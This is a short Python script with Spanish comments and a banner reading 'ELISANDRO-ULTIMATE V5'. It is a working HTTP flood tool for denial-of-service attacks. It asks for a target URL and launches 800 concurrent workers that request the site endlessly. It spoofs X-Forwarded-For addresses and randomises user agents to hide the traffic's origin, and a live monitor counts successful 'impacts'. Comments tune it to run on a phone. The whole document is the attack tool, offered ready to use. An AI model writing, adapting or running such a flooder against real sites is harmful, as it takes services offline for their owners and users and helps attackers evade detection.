import asyncio
import aiohttp
import random
import os
import time
from colorama import Fore, Style, init

init()

async def bombardear(url, session, id, stats):
    while True:
        try:
            headers = {
                'User-Agent': f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) {random.randint(1,100)}",
                'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            }
            # Micro-pausa para no trabar tu Tecno Spark
            await asyncio.sleep(0.01) 
            
            async with session.get(url, headers=headers, timeout=2) as r:
                stats['exitos'] += 1
        except:
            stats['caídos'] += 1

async def monitor(stats):
    while True:
        await asyncio.sleep(1)
        os.system('clear')
        print(f"{Fore.RED}██ ELISANDRO-ULTIMATE V5: MONITOR DE IMPACTO ██")
        print(f"{Fore.GREEN}[+] IMPACTOS EXITOSOS: {stats['exitos']}")
        print(f"{Fore.YELLOW}[!] RECHAZADOS/CAÍDOS: {stats['caídos']}")
        print(f"{Fore.CYAN}[*] ESTADO: ENVIANDO RÁFAGAS MASIVAS...")
        print(f"{Fore.WHITE}----------------------------------------------")

async def main():
    os.system('clear')
    print(f"{Fore.RED}↓↓↓ PEGA EL ENLACE AQUÍ Y DALE A ENTER ↓↓↓")
    target = input(f"{Fore.YELLOW}URL: {Fore.WHITE}").strip()
    
    stats = {'exitos': 0, 'caídos': 0}
    
    # Bajamos a 800 conexiones para que tu internet no se muera
    connector = aiohttp.TCPConnector(limit=800, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        # Iniciamos el monitor visual
        asyncio.create_task(monitor(stats))
        
        # Iniciamos el enjambre
        tasks = [bombardear(target, session, i, stats) for i in range(800)]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())
